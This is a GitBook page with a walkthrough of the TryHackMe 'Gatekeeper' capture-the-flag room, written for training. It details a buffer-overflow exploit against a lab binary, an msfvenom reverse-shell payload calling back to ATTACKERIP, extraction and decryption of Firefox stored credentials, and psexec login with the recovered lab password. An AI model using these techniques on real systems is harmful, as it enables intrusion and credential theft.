
<!DOCTYPE HTML>
<html lang="" >
    <head>
        <meta charset="UTF-8">
        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <title>Gatekeeper Â· GitBook</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="description" content="">
        <meta name="generator" content="GitBook 3.2.3">
        
        
        
    
    <link rel="stylesheet" href="../gitbook/style.css">

    
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
                
            
                
                <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                
            
        

    

    
        
    
        
    
        
    
        
    
        
    
        
    

        
    
    
    <meta name="HandheldFriendly" content="true"/>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../gitbook/images/apple-touch-icon-precomposed-152.png">
    <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">

    
    
    <link rel="prev" href="brainstorm.html" />
    

    </head>
    <body>
        
<div class="book">
    <div class="book-summary">
        
            
<div id="book-search-input" role="search">
    <input type="text" placeholder="Type to search" />
</div>

            
                <nav role="navigation">
                


<ul class="summary">
    
    

    

    
        
        
    
        <li class="chapter " data-level="1.1" data-path="../">
            
                <a href="../">
            
                    
                    Offensive Path - TryHackMe
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2" data-path="../getting-started/">
            
                <a href="../getting-started/">
            
                    
                    Getting Started
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.2.1" data-path="../getting-started/tutorial.html">
            
                <a href="../getting-started/tutorial.html">
            
                    
                    Tutorial
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.2" data-path="../getting-started/vulnversity.html">
            
                <a href="../getting-started/vulnversity.html">
            
                    
                    Vulnversity
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.3" data-path="../getting-started/blue.html">
            
                <a href="../getting-started/blue.html">
            
                    
                    Blue
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.2.4" data-path="../getting-started/kenobi.html">
            
                <a href="../getting-started/kenobi.html">
            
                    
                    Kenobi
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.3" data-path="../advanced-exploitation/">
            
                <a href="../advanced-exploitation/">
            
                    
                    Advanced Exploitation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.3.1" data-path="../advanced-exploitation/steel-mountain.html">
            
                <a href="../advanced-exploitation/steel-mountain.html">
            
                    
                    Steel Mountain
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.2" data-path="../advanced-exploitation/alfred.html">
            
                <a href="../advanced-exploitation/alfred.html">
            
                    
                    Alfred
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.3" data-path="../advanced-exploitation/hackpark.html">
            
                <a href="../advanced-exploitation/hackpark.html">
            
                    
                    HackPark
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.4" data-path="../advanced-exploitation/game-zone.html">
            
                <a href="../advanced-exploitation/game-zone.html">
            
                    
                    Game Zone
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.5" data-path="../advanced-exploitation/skynet.html">
            
                <a href="../advanced-exploitation/skynet.html">
            
                    
                    Skynet
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.6" data-path="../advanced-exploitation/daily-bugle.html">
            
                <a href="../advanced-exploitation/daily-bugle.html">
            
                    
                    Daily Bugle
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.7" data-path="../advanced-exploitation/overpass-2-hacked.html">
            
                <a href="../advanced-exploitation/overpass-2-hacked.html">
            
                    
                    Overpass 2 - Hacked
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.8" data-path="../advanced-exploitation/relevant.html">
            
                <a href="../advanced-exploitation/relevant.html">
            
                    
                    Relevant
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.3.9" data-path="../advanced-exploitation/internal.html">
            
                <a href="../advanced-exploitation/internal.html">
            
                    
                    Internal
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.4" data-path="../active-directory/">
            
                <a href="../active-directory/">
            
                    
                    Active Directory
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.4.1" data-path="../active-directory/active-directory-basics.html">
            
                <a href="../active-directory/active-directory-basics.html">
            
                    
                    Active Directory Basics
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    
        <li class="chapter " data-level="1.5" data-path="./">
            
                <a href="./">
            
                    
                    Binary Overflow Exploitation
            
                </a>
            

            
            <ul class="articles">
                
    
        <li class="chapter " data-level="1.5.1" data-path="buffer-overflow-prep.html">
            
                <a href="buffer-overflow-prep.html">
            
                    
                    Buffer Overflow Prep
            
                </a>
            

            
        </li>
    
        <li class="chapter " data-level="1.5.2" data-path="brainstorm.html">
            
                <a href="brainstorm.html">
            
                    
                    Brainstorm
            
                </a>
            

            
        </li>
    
        <li class="chapter active" data-level="1.5.3" data-path="gatekeeper.html">
            
                <a href="gatekeeper.html">
            
                    
                    Gatekeeper
            
                </a>
            

            
        </li>
    

            </ul>
            
        </li>
    

    

    <li class="divider"></li>

    <li>
        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
            Published with GitBook
        </a>
    </li>
</ul>


                </nav>
            
        
    </div>

    <div class="book-body">
        
            <div class="body-inner">
                
                    

<div class="book-header" role="navigation">
    

    <!-- Title -->
    <h1>
        <i class="fa fa-circle-o-notch fa-spin"></i>
        <a href=".." >Gatekeeper</a>
    </h1>
</div>




                    <div class="page-wrapper" tabindex="-1" role="main">
                        <div class="page-inner">
                            
<div id="book-search-results">
    <div class="search-noresults">
    
                                <section class="normal markdown-section">
                                
                                <h1 id="gatekeeper">Gatekeeper</h1>
<h3 id="tasks">Tasks:</h3>
<ol>
<li><strong>Approach the Gates</strong>:<ol>
<li>Deploy the machine and complete the task.</li>
</ol>
</li>
<li><strong>Defeat the Gatekeeper and pass through the fire</strong>:<ol>
<li>Start with usual nmap service scan - <code>nmap -sC ip</code> - 139,445(SMB),3389(RDP), 31337 (Elite ?) and many other RPC ports open.</li>
<li>Enumerate SMB shares using <code>smbclient -L \\ip\</code> , There&apos;s a share called Users accessible without password. Connect to Users share using <code>smbclient \\ip\Users\</code> , <code>cd Share</code>, <code>get gatekeeper.exe</code>. Copy the binary to windows VM for simpler testing.</li>
<li><code>nc ip 31337</code> , There is a application which takes username as input and outputs &apos;hello username!!!&apos;. This is the same application we got through smb.</li>
<li>Open gatekeeper.exe in Immunity Debugger</li>
<li>Run <code>ncat 127.0.0.1 31337</code> - you should get connected to gatekeeper locally.</li>
<li>Generate a long string of 200 bytes using <code>python -c &quot;print(&apos;A&apos;*200)&quot;</code> and feed that as input in ncat terminal for username , the application should crash which confirms bufferoverflow.</li>
<li>Generate cyclic string of length 200 using <a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/" target="_blank">online tool</a> or using metasploit framework pattern_create.rb and send the cyclic string as username this time and note the EIP when application crashes. - 39654138</li>
<li>Enter the EIP register value in same <a href="https://wiremask.eu/tools/buffer-overflow-pattern-generator/" target="_blank">online tool</a> or use <code>!mona findmsp -distance 200</code> to find exact offset which breaks buffer - 146</li>
<li>In <a href="https://gist.github.com/jayateertha043/8f8d79f5bfd307632a51779f58f16932" target="_blank">exploit.py</a> replace payload with bad chars and run <a href="https://gist.github.com/jayateertha043/8f8d79f5bfd307632a51779f58f16932" target="_blank">exploit.py</a>, notice that we have control over EIP(42424242).</li>
<li>Look for missing bad characters if any by following ESP stack dump. If any of them is missing or not in order, try removing them from payload and repeat till all the bad characters are in same order as sent. <code>Bad chars - \x00\x0a</code></li>
<li>Run <code>!mona jmp -r esp -cpb &quot;\x00\x0a&quot;</code>  to know jmp esp address - 080414C3 and convert to little endian <code>\xc3\x14\x04\x08</code> then replace it in retn variable of <a href="https://gist.github.com/jayateertha043/8f8d79f5bfd307632a51779f58f16932" target="_blank">exploit.py</a> also assign <code>&quot;\x90&quot; * 15</code> to padding variable(NOPs).</li>
<li>Generate payload using <code>msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKERIP LPORT=4444 -b &apos;\x00\x0a&apos; -f py -v payload</code> and replace the payload in <a href="https://gist.github.com/jayateertha043/8f8d79f5bfd307632a51779f58f16932" target="_blank">exploit.py</a>.</li>
<li>Start netcat listener - <code>nc -nlvp 4444</code></li>
<li>Run exploit.py to get shell in netcat listener.</li>
<li><code>type user.txt.txt</code> to get user flag and submit. Also notice in desktop there is a file called Firefox.lnk , which suggests firefox is installed in the machine.</li>
<li><code>cd C:\Users\natbat\AppData\Roaming\Mozilla\Firefox\Profiles\ljfn812a.default-release</code>, <code>copy logins.json C:\Users\Share</code> , <code>copy cert9.db C:\Users\Share</code>, <code>copy key4.db C:\Users\Share</code> , <code>copy cookies.sqlite C:\Users\Share</code> - Now you can download these using smbclient to your local machine.</li>
<li><em>Clone this </em><a href="https://github.com/unode/firefoxdecrypt.git" target="_blank"><em>repo</em></a><em> , Copy the 4 files to a folder called loot</em>, <code>python firefox_decrypt.py</code> <code>&quot;LootFolderLocation&quot;</code> - mayor:8CL7O1N78MdrCIsV creds obtained.</li>
<li>Use <code>psexec.py mayor:8CL7O1N78MdrCIsV@ip</code> to login as mayor, type <code>whoami</code> - mayor seems to be system user.</li>
<li><code>cd C:\Users\mayor\Desktop</code> and <code>type root.txt.txt</code> to obtain root flag and submit !!!</li>
</ol>
</li>
</ol>

                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="brainstorm.html" class="navigation navigation-prev navigation-unique" aria-label="Previous page: Brainstorm">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"title":"Gatekeeper","level":"1.5.3","depth":2,"previous":{"title":"Brainstorm","level":"1.5.2","depth":2,"path":"binary-overflow-exploitation/brainstorm.md","ref":"binary-overflow-exploitation/brainstorm.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"binary-overflow-exploitation/gatekeeper.md","mtime":"2021-11-27T14:43:59.610Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-11-27T14:44:24.389Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search/search-engine.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

